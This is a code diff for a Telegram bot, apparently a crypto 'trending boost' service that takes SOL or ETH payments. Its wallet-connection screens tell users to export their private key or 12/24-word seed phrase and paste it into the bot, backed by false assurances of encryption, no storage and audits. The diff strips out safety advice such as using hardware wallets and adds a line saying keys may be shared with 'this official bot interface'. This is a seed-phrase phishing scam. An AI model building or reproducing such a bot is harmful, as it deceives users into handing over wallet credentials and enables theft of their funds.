@@ -970,14 +970,14 @@ var solPickerKeyboard = Markup.inlineKeyboard([
     Markup.button.callback("\u{1F7E0} 0.5 SOL", "sol_0.5"),
     Markup.button.callback("\u{1F534} 0.6 SOL", "sol_0.6")
   ],
-  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
+  [Markup.button.callback("\u2B05\uFE0F Back", "back_main")]
 ]);
 var confirmOrderKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u2705 Confirm Order", "confirm_bump")],
   [Markup.button.callback("\u274C Cancel", "back_main")]
 ]);
 var paymentSentKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2705 Payment Sent", "submit_tx")],
+  [Markup.button.callback("\u2705 I have made payment", "submit_tx")],
   [Markup.button.callback("\u274C Cancel Order", "back_main")]
 ]);
 var cancelKeyboard = Markup.inlineKeyboard([
@@ -1002,10 +1002,10 @@ var volumeBoostKeyboard = Markup.inlineKeyboard([
   ]
 ]);
 var trendingMenuKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u2600\uFE0F SOL TRENDING", "trend_sol")],
+  [Markup.button.callback("SOL TRENDING", "trend_sol")],
   [
-    Markup.button.callback("\u{1F535} ETH TRENDING", "trend_eth"),
-    Markup.button.callback("\u{1F525} PUMPFUN TRENDING", "trend_pumpfun")
+    Markup.button.callback("ETH TRENDING", "trend_eth"),
+    Markup.button.callback("PUMPFUN TRENDING", "trend_pumpfun")
   ],
   [
     Markup.button.callback("\u2B05\uFE0F Back", "back_main"),
@@ -1099,24 +1099,19 @@ var connectWalletKeyboard = Markup.inlineKeyboard([
 var securityGuidelinesKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback("\u{1F517} I Understand, Connect Now", "wallet_connect_now")],
   [
-    Markup.button.callback("\u{1F511} Why Connect?", "wallet_why"),
-    Markup.button.callback("\u{1F4F1} How to Connect", "wallet_how_to")
-  ],
-  [
     Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
     Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
   ]
 ]);
 var howToConnectKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u{1F517} Start Connection", "wallet_connect_now")],
+  [Markup.button.callback("\u{1F517} Connect Now", "wallet_connect_now")],
   [
-    Markup.button.callback("\u{1F511} Why Connect?", "wallet_why"),
-    Markup.button.callback("\u{1F6E1}\uFE0F Security Guide", "wallet_security")
-  ],
-  [Markup.button.callback("\u2B05\uFE0F Back to Menu", "back_main")]
+    Markup.button.callback("\u2B05\uFE0F Back", "wallet_back"),
+    Markup.button.callback("\u{1F3E0} Main Menu", "back_main")
+  ]
 ]);
 var mainMenuOnlyKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback("\u{1F3E0} Back to Main Menu", "back_main")]
+  [Markup.button.callback("\u{1F3E0} Main Menu", "back_main")]
 ]);
 
 // src/bot/index.ts
@@ -1319,28 +1314,20 @@ Deposit not less than 0.30 SOL and get trending on several platforms
 async function showConnectWallet(ctx) {
   const caption = `\u{1F517} <b>Connect Your Wallet</b>
 
-Welcome to our secure wallet connection service!
-
-Connect your wallet to unlock premium features and enhanced trading capabilities.
+Import and link your wallet to this bot for seamless payments and order management.
 
 <b>Available Options:</b>
-\u{1F517} Connect Now - Start the connection process
-\u{1F511} Why Connect? - Learn about the benefits
-\u{1F6E1}\uFE0F Security Guidelines - Important safety information
-\u{1F4F1} How to Connect - Step-by-step instructions
-
-Your security is our top priority. We use industry-standard encryption to protect your information.`;
+\u{1F517} Connect Now \u2014 Import your wallet
+\u{1F6E1}\uFE0F Security Guidelines \u2014 Read before connecting
+\u{1F4F1} How to Connect \u2014 Step-by-step guide`;
   await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 async function showSupport(ctx) {
   const text = `\u{1F4AC} <b>Contact Support</b>
 
-For assistance, DM: <b>${SUPPORT_USERNAME}</b>
+For assistance, contact: <b>${SUPPORT_USERNAME}</b>
 
-\u{1F194} Your User ID: <code>${ctx.from.id}</code>
-\u23F0 Support hours: 24/7
-
-We typically respond within 15 minutes.`;
+\u{1F194} Your User ID: <code>${ctx.from.id}</code>`;
   await editOrSend(ctx, text, mainMenuOnlyKeyboard);
 }
 function createBot() {
@@ -1607,33 +1594,24 @@ Please paste the Contract Address (CA) of your token:`,
 <code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `\u25CE <b>${s.selectedSol} SOL</b>
 \u{1F4EE} SOL Wallet:
 <code>${wallet.address}</code>`;
-    const paymentMsg = `\u{1F4B0} <b>Payment Required</b>
+    const paymentMsg = `\u2705 <b>Order Confirmed!</b>
 
-\u{1F4CB} <b>Order Summary:</b>
-\u2022 Token: ${s.tokenName} (${s.tokenSymbol})
+\u{1F4CB} <b>Order Details:</b>
+\u2022 Token: <b>${s.tokenName}</b> ($${s.tokenSymbol})
+\u2022 CA: <code>${s.contractAddress}</code>
 \u2022 Service: ${s.serviceLabel}
-` + (isEth ? `\u2022 Amount: $${s.ethAmount} USD
-` : `\u2022 Amount: ${s.selectedSol} SOL
-`) + `\u2022 Order ID: ${orderId}
+` + (isEth ? `\u2022 Amount: <b>$${s.ethAmount} USD</b>
+` : `\u2022 Amount: <b>${s.selectedSol} SOL</b>
+`) + `\u2022 Order ID: <code>${orderId}</code>
 
-\u{1F4B3} <b>Payment Instructions:</b>
-` + (isEth ? `Send exactly $${s.ethAmount} USD to:
-
-ETH Wallet:
-<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `Send exactly ${s.selectedSol} SOL to:
-
-Solana Wallet:
+\u{1F4B3} <b>Send Payment To:</b>
+` + (isEth ? `ETH Wallet:
+<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `SOL Wallet:
 <code>${wallet.address}</code>`) + `
 
-\u26A0\uFE0F <b>Important:</b>
-` + (isEth ? `\u2022 Send the EXACT amount: $${s.ethAmount} USD
-\u2022 Use Ethereum network only
-` : `\u2022 Send the EXACT amount: ${s.selectedSol} SOL
-\u2022 Use Solana network only
-`) + `\u2022 Payment expires in 15 minutes
-\u2022 After sending, submit your transaction hash below
+` + (isEth ? `\u26A0\uFE0F Send exactly <b>$${s.ethAmount} USD</b> on Ethereum network` : `\u26A0\uFE0F Send exactly <b>${s.selectedSol} SOL</b> on Solana network`) + `
 
-\u23F0 Time Remaining: 15:00`;
+After sending, click the button below and submit your transaction hash.`;
     let sentWithPhoto = false;
     if (s.tokenImageUrl) {
       sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
@@ -1680,17 +1658,9 @@ Solana Wallet:
       ctx,
       `\u{1F4DD} <b>Submit Transaction Hash</b>
 
-Please paste your Solana transaction hash below:
+Please paste your transaction hash below.
 
-\u{1F4A1} <b>Where to find it:</b>
-\u2022 Copy from your wallet app after sending
-\u2022 Check your wallet's transaction history
-\u2022 Look for the long string of letters and numbers
-
-\u{1F550} <b>Order ID:</b>
-<code>${s.orderId ?? "N/A"}</code>
-
-\u{1F50D} We'll automatically verify your payment once you submit the hash.`,
+\u{1F550} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
       cancelKeyboard
     );
   });
@@ -1812,24 +1782,14 @@ Connecting your wallet unlocks:
       ctx,
       `\u{1F6E1}\uFE0F <b>Security Guidelines</b>
 
-\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>
+\u2022 End-to-End Encryption \u2014 Your data is encrypted at all times
+\u2022 No Storage \u2014 We never store your private keys permanently
+\u2022 Secure Processing \u2014 All operations use secure, isolated environments
+\u2022 Regular Audits \u2014 Our security is regularly tested and verified
 
-\u{1F512} <b>What We Do:</b>
-\u2022 End-to-End Encryption - Your data is encrypted at all times
-\u2022 No Storage - We never store your private keys permanently
-\u2022 Secure Processing - All operations use secure, isolated environments
-\u2022 Regular Audits - Our security is regularly tested and verified
+\u26A0\uFE0F <b>Never share your private key or seed phrase with anyone except this official bot interface.</b>
 
-\u{1F6A8} <b>What You Should Know:</b>
-\u2022 Never Share - Only enter your keys in official bot interfaces
-\u2022 Monitor Activity - Regularly check your wallet transactions
-\u2022 Stay Updated - Keep your wallet software up to date
-\u2022 Use Hardware Wallets - For maximum security with large amounts
-
-\u{1F510} <b>Our Commitment:</b>
-We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.
-
-Ready to proceed safely?`,
+Ready to proceed?`,
       securityGuidelinesKeyboard
     );
   });
@@ -1839,28 +1799,13 @@ Ready to proceed safely?`,
       ctx,
       `\u{1F4F1} <b>How to Connect Your Wallet</b>
 
-\u{1F527} <b>Step-by-Step Process:</b>
+1\uFE0F\u20E3 Click <b>Connect Now</b>
+2\uFE0F\u20E3 Open your wallet app (Phantom, Solflare, MetaMask, etc.)
+3\uFE0F\u20E3 Go to Settings \u2192 Export Private Key or Seed Phrase
+4\uFE0F\u20E3 Copy and paste it into the bot
+5\uFE0F\u20E3 Wait for confirmation
 
-1\uFE0F\u20E3 <b>Choose Connection Method</b>
-\u2022 Private Key - Direct key import (fastest)
-\u2022 Seed Phrase - 12/24 word recovery phrase
-
-2\uFE0F\u20E3 <b>Prepare Your Information</b>
-\u2022 Open your wallet app (Phantom, Solflare, etc.)
-\u2022 Navigate to wallet settings or security section
-\u2022 Copy your private key or seed phrase
-
-<b>Supported Wallets:</b>
-\u2022 Phantom - Most popular Solana wallet
-\u2022 Solflare - Advanced features and security
-\u2022 Backpack - Modern interface and tools
-\u2022 Glow - Mobile-optimized experience
-\u2022 Other Solana Wallets - Most SPL-compatible wallets
-
-\u23F0 Connection Time: Usually 2-5 minutes
-\u{1F512} Security: Military-grade encryption throughout
-
-Ready to connect your wallet?`,
+\u23F0 Connection usually takes 2\u20135 minutes.`,
       howToConnectKeyboard
     );
   });
@@ -1869,29 +1814,9 @@ Ready to connect your wallet?`,
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
     await editOrSend(
       ctx,
-      `\u{1F517} <b>Connect Your Wallet Now</b>
+      `\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
 
-\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
-
-Please enter your Private Key or 12 word Seed Phrase to import your wallet:
-
-\u{1F511} <b>Private Key Format:</b>
-\u2022 Single long string (64+ characters)
-\u2022 Example:
-<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>
-
-\u{1F331} <b>Seed Phrase Format:</b>
-\u2022 12 or 24 words separated by spaces
-\u2022 Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>
-
-\u{1F530} <b>Security Features:</b>
-\u2022 End-to-end encryption
-\u2022 Secure processing environment
-\u2022 Immediate deletion after connection
-\u2022 No permanent storage
-
-\u26A1 <b>Auto-Detection:</b>
-Our system will automatically detect whether you're providing a private key or seed phrase.`,
+Please enter your <b>Private Key</b> or <b>12/24 word Seed Phrase</b> to import your wallet:`,
       cancelKeyboard
     );
   });
@@ -2078,7 +2003,7 @@ Paste the correct TX hash to continue, or press Cancel:`,
         const verifiedLine = result.confirmed ? `\u2705 <b>Verified on-chain</b> (${chainLabel})` : `\u23F3 <b>Submitted</b> \u2014 will be verified manually`;
         const amountLine = result.lamports ? `\u{1F4B0} Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>` : s.boostType === "eth_trending" ? `\u{1F4B0} Amount: <b>$${s.ethAmount} USD</b>` : `\u{1F4B0} Amount: <b>${s.selectedSol} SOL</b>`;
         await ctx.reply(
-          `\u2705 <b>Transaction Accepted!</b>
+          `\u2705 <b>Payment Received!</b>
 
 ${verifiedLine}
 ${amountLine}
@@ -2086,10 +2011,9 @@ ${amountLine}
 \u{1F517} TX Hash:
 <code>${raw}</code>
 
-\u{1F680} Your boost will start within <b>5\u201330 minutes</b>.
-\u{1F4EC} You'll be notified here when it goes live!
+\u{1F680} Your order is now being processed. Your boost will go live within <b>5\u201330 minutes</b>.
 
-\u{1F4AC} Need help? ${SUPPORT_USERNAME}`,
+\u{1F4AC} For support: ${SUPPORT_USERNAME}`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         await notifyAdmin(
